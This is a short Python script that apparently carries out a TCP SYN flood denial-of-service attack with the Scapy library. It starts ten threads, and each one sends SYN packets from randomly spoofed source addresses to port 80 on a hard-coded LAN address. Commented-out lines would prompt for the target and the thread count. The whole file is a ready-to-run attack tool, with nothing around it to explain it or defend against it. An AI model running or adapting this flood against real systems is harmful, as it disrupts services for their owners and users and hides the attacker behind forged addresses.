import threading
from scapy.all import *
# tarIP = input("Target IP:")
#countThread = int(input("Enter Threads:"))
def tcpFlood(dest):
    for x in range(100):
        IP_Packet = IP()
        IP_Packet.src = str(RandIP())
        IP_Packet.dst = dest

        TCP_Packet = TCP()
        TCP_Packet.sport = RandShort()
        TCP_Packet.dport = 80
        TCP_Packet.flags = "S"
        send(IP_Packet/TCP_Packet,verbose=False)
        print("-"*35 + "TCP FLOOD"+35*"-"+"\n")  
#threads = countThread
threads = []
for _ in range(10):
    t = threading.Thread(target=tcpFlood,args=("192.168.1.17",))
    t.start()
    threads.append(t)
for thread in threads:
    thread.join()
